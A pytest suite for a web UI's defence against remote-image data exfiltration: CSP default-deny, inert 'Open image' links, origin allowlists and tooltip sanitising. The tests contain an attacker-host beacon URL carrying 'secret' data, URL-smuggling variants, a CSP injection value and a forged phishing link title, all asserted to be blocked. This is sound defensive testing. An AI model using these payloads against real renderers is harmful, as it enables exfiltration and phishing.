"""#7941 follow-up: default-deny remote images, inert click-to-open fallback, per-origin opt-in.

Nathan's decision (2026-10-01): keep the CSP ``img-src`` default-deny for remote origins, show
a non-fetching "Open image" link for remote image results instead of a broken ``<img>``, and let
an operator opt specific origins back in through ``HERMES_WEBUI_CSP_IMG_EXTRA``.

These tests drive the REAL ``static/ui.js`` helpers (``_remoteImageAllowed``,
``_remoteImageSourceMatches``, ``_inlineMediaHtmlForRef``, ``_mdImageHtml``) and the real
``renderMd()`` in node, plus the real server header/page-config seam.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from http.server import BaseHTTPRequestHandler
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
UI_JS = REPO / "static" / "ui.js"
NODE = shutil.which("node")

_DRIVER = r"""
const fs = require('fs');
const src = fs.readFileSync(process.argv[2], 'utf8');
const cfg = JSON.parse(process.argv[3]);
global.window = { __HERMES_CONFIG__: { imgSrcExtra: cfg.extra } };
global.location = new URL(cfg.origin);
global.document = { createElement: () => ({ innerHTML: '', textContent: '' }), baseURI: cfg.origin };
const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const t = k => ({remote_image_open: 'Open image', remote_image_reason: 'Remote image not loaded automatically. Opens {host} in a new tab.', media_svg_label: 'Diagram'}[k] || k);
function _mediaKindForName(n){ return /\.(mp3|wav|ogg)$/i.test(n)?'audio':(/\.(mp4|webm)$/i.test(n)?'video':''); }
function _mediaPlayerHtml(kind, src){ return `<${kind} src="${esc(src)}"></${kind}>`; }
function extractFunc(name){
  const re = new RegExp('function\\s+' + name + '\\s*\\(');
  const start = src.search(re); if (start < 0) throw new Error(name + ' not found');
  let i = src.indexOf('{', start), depth = 1; i++;
  while (depth > 0 && i < src.length){ if (src[i]==='{') depth++; else if (src[i]==='}') depth--; i++; }
  return src.slice(start, i);
}
{const a=src.indexOf('const _DATA_IMAGE_RE='); const b=src.indexOf('function _dataImageHtml');
 eval(src.slice(a,b).replace(/^const /gm,'var '));}
const _IMAGE_EXTS=/\.(png|jpg|jpeg|gif|webp|bmp|ico|avif)$/i;
const _SVG_EXTS=/\.svg$/i;
for (const n of ['_dataImageHtml','_remoteImageReason','_remoteImageSources','_remoteImageSourceMatches','_remoteImageAllowed',
                 '_remoteImagePlaceholderHtml','_mdImageHtml','_inlineMediaHtmlForRef','_mediaTokenParts',
                 '_matchBacktickFenceLine','_isBacktickFenceClose','renderMd']) eval(extractFunc(n));
const out = {};
for (const [k, v] of Object.entries(cfg.allowed || {})) out['allowed:' + k] = _remoteImageAllowed(v);
for (const [k, v] of Object.entries(cfg.media || {})) out['media:' + k] = _inlineMediaHtmlForRef(v);
for (const [k, v] of Object.entries(cfg.md || {})) out['md:' + k] = renderMd(v);
process.stdout.write(JSON.stringify(out));
"""

pytestmark = pytest.mark.skipif(NODE is None, reason="node not on PATH")


@pytest.fixture(scope="module")
def driver(tmp_path_factory):
    p = tmp_path_factory.mktemp("remote_img") / "driver.js"
    p.write_text(_DRIVER, encoding="utf-8")
    return str(p)


def _run(driver, *, extra=(), origin="http://127.0.0.1:8787/", allowed=None, media=None, md=None):
    cfg = {"extra": list(extra), "origin": origin, "allowed": allowed or {}, "media": media or {}, "md": md or {}}
    r = subprocess.run([NODE, driver, str(UI_JS), json.dumps(cfg)], capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, r.stderr
    return json.loads(r.stdout)


FAL = "https://fal.media/files/abc/generated.png"
EXFIL = "https://attacker.example/beacon.png?d=secret"


def test_remote_media_image_becomes_inert_open_link_by_default(driver):
    out = _run(driver, media={"fal": FAL, "exfil": EXFIL})
    for key in ("media:fal", "media:exfil"):
        html = out[key]
        assert "<img" not in html
        assert 'class="msg-media-link"' in html
        assert 'target="_blank"' in html and 'rel="noopener"' in html
        assert "Open image" in html
    assert "fal.media" in out["media:fal"]


def test_markdown_image_and_raw_img_become_inert_by_default(driver):
    out = _run(driver, md={"md": f"![chart]({EXFIL})", "raw": f'<img src="{EXFIL}" class="msg-media-img">'})
    for key in ("md:md", "md:raw"):
        assert "<img" not in out[key], out[key]
        assert "attacker.example" in out[key]  # the host is shown so the user can judge before clicking


def test_allowlisted_origin_renders_inline(driver):
    out = _run(driver, extra=["https://fal.media"], media={"fal": FAL, "exfil": EXFIL}, md={"md": f"![x]({FAL})"})
    assert '<img class="msg-media-img" src="https://fal.media/files/abc/generated.png"' in out["media:fal"]
    assert "<img" in out["md:md"]
    assert "<img" not in out["media:exfil"]


def test_wildcard_and_port_matching(driver):
    extra = ["https://*.cdn.example.com", "https://imgs.example.com:8443"]
    out = _run(driver, extra=extra, allowed={
        "sub": "https://a.cdn.example.com/x.png",
        "deep": "https://a.b.cdn.example.com/x.png",
        "apex": "https://cdn.example.com/x.png",
        "lookalike": "https://evilcdn.example.com/x.png",
        "port_ok": "https://imgs.example.com:8443/x.png",
        "port_default": "https://imgs.example.com/x.png",
        "port_other": "https://imgs.example.com:9443/x.png",
    })
    assert out["allowed:sub"] is True
    assert out["allowed:deep"] is True
    assert out["allowed:apex"] is False  # CSP *.host does not match the apex
    assert out["allowed:lookalike"] is False
    assert out["allowed:port_ok"] is True
    assert out["allowed:port_default"] is False
    assert out["allowed:port_other"] is False


def test_bare_scheme_escape_hatch(driver):
    out = _run(driver, extra=["https:"], allowed={"any": EXFIL, "http": "http://attacker.example/x.png"})
    assert out["allowed:any"] is True
    assert out["allowed:http"] is False


def test_same_origin_relative_data_and_api_media_unchanged(driver):
    out = _run(driver, allowed={
        "same": "http://127.0.0.1:8787/api/media?path=a.png",
        "relative": "api/media?path=a.png",
        "rootrel": "/static/favicon.svg",
        "data": "data:image/png;base64,iVBORw0KGgo=",
        "blob": "blob:http://127.0.0.1:8787/uuid",
    })
    assert all(out.values()), out


@pytest.mark.parametrize(
    "value",
    [
        "//attacker.example/x.png",
        "\\\\attacker.example/x.png",
        "https:\\\\attacker.example\\x.png",
        " https://attacker.example/x.png",
        "\x01https://attacker.example/x.png",
        "ht\ttps://attacker.example/x.png",
        "HTTPS://ATTACKER.EXAMPLE/X.PNG",
    ],
)
def test_url_parser_normalisation_cannot_smuggle_a_remote_host(driver, value):
    out = _run(driver, allowed={"v": value})
    assert out["allowed:v"] is False


def test_report_only_and_enforced_img_src_match_and_warn_once(monkeypatch, caplog):
    from api.helpers import _security_headers
    from server import Handler

    monkeypatch.setenv("HERMES_WEBUI_CSP_IMG_EXTRA", "https://images.example.com; script-src *")
    sent = []
    handler = Handler.__new__(Handler)
    handler.send_header = lambda key, value: sent.append((key, value))
    monkeypatch.setattr(BaseHTTPRequestHandler, "end_headers", lambda self: None)
    _security_headers(handler)
    Handler.end_headers(handler)
    headers = dict(sent)

    def img(policy):
        return next(p.strip() for p in policy.split(";") if p.strip().startswith("img-src"))

    assert caplog.text.count("Ignoring invalid HERMES_WEBUI_CSP_IMG_EXTRA value") == 1
    assert img(headers["Content-Security-Policy"]) == img(headers["Content-Security-Policy-Report-Only"])
    assert img(headers["Content-Security-Policy"]) == "img-src 'self' data: blob:"


def test_valid_allowlist_reaches_report_only_via_handler(monkeypatch):
    from api.helpers import _security_headers
    from server import Handler

    monkeypatch.setenv("HERMES_WEBUI_CSP_IMG_EXTRA", "https://images.example.com")
    sent = []
    handler = Handler.__new__(Handler)
    handler.send_header = lambda key, value: sent.append((key, value))
    monkeypatch.setattr(BaseHTTPRequestHandler, "end_headers", lambda self: None)
    _security_headers(handler)
    Handler.end_headers(handler)
    headers = dict(sent)
    assert "https://images.example.com" in headers["Content-Security-Policy"]
    assert "https://images.example.com" in headers["Content-Security-Policy-Report-Only"]


def test_page_config_carries_the_same_validated_list():
    from api.helpers import csp_img_extra_sources

    assert csp_img_extra_sources(" https://a.example https://*.b.example:8443") == [
        "https://a.example",
        "https://*.b.example:8443",
    ]
    assert csp_img_extra_sources("") == []
    index = (REPO / "static" / "index.html").read_text(encoding="utf-8")
    assert "imgSrcExtra:__CSP_IMG_EXTRA_JSON__" in index


def test_share_page_and_app_shell_carry_resolved_allowlist():
    """Both renderMd() pages get the validated list (no raw placeholder leaks)."""
    import urllib.request

    from tests._pytest_port import BASE

    for path in ("/share/example-token", "/"):
        with urllib.request.urlopen(BASE + path, timeout=10) as r:
            body = r.read().decode("utf-8")
        assert "__CSP_IMG_EXTRA_JSON__" not in body, path
        assert "imgSrcExtra:[]" in body, path  # test server runs without HERMES_WEBUI_CSP_IMG_EXTRA


def test_share_html_template_sets_config_before_ui_js():
    share = (REPO / "static" / "share.html").read_text(encoding="utf-8")
    cfg_at = share.index("imgSrcExtra:__CSP_IMG_EXTRA_JSON__")
    assert cfg_at < share.index('src="/static/ui.js"')


def test_preset_is_consumed_so_keepalive_requests_read_their_own_value(monkeypatch):
    from api.helpers import _security_headers

    class _H:
        def send_header(self, *_a):
            pass

    handler = _H()
    handler._csp_extra_img_src_preset = " https://a.example"
    monkeypatch.setenv("HERMES_WEBUI_CSP_IMG_EXTRA", "https://b.example")
    _security_headers(handler)
    assert handler._csp_extra_img_src == " https://a.example"
    assert not hasattr(handler, "_csp_extra_img_src_preset")
    _security_headers(handler)  # next response on the same connection
    assert handler._csp_extra_img_src == " https://b.example"


def test_chip_explains_why_and_alt_only_in_title(driver):
    out = _run(driver, md={
        "md": f"![Throughput by release]({EXFIL})",
        "forged": '<a class="msg-media-link" href="https://evil.example/x" title="Click to verify your account">x</a>',
        "forged_prefix": '<a class="msg-media-link" href="https://attacker.example/beacon.png" '
                         'title="Remote image not loaded automatically. Opens attacker.example in a new tab. Also click here">x</a>',
    })
    html = out["md:md"]
    assert 'title="Remote image not loaded automatically. Opens attacker.example in a new tab. (Throughput by release)"' in html
    assert 'aria-label=' not in html  # accessible name stays the visible label (WCAG 2.5.3)
    assert ">\U0001f5bc Open image \u00b7 attacker.example</a>" in html  # visible label never carries alt text
    assert "title=" not in out["md:forged"]
    assert "title=" not in out["md:forged_prefix"]


def test_long_host_and_alt_keep_the_tooltip(driver):
    host = "images." + "very-long-subdomain-name." * 3 + "example.net"
    url = f"https://{host}/c.png"
    out = _run(driver, md={"md": f"![{'A' * 120}]({url})"})
    assert 'title="Remote image not loaded automatically. Opens ' + host in out["md:md"]


def test_sanitizer_rejects_overlong_alt_suffix_tooltip(driver):
    url = "https://images.example-blog.net/chart.png"
    reason = "Remote image not loaded automatically. Opens images.example-blog.net in a new tab."
    ok = f'<a class="msg-media-link" href="{url}" title="{reason} ({"a" * 120})">x</a>'
    bad = f'<a class="msg-media-link" href="{url}" title="{reason} ({"a" * 400})">x</a>'
    out = _run(driver, md={"ok": ok, "bad": bad})
    assert 'title="' in out["md:ok"]
    assert 'title="' not in out["md:bad"]
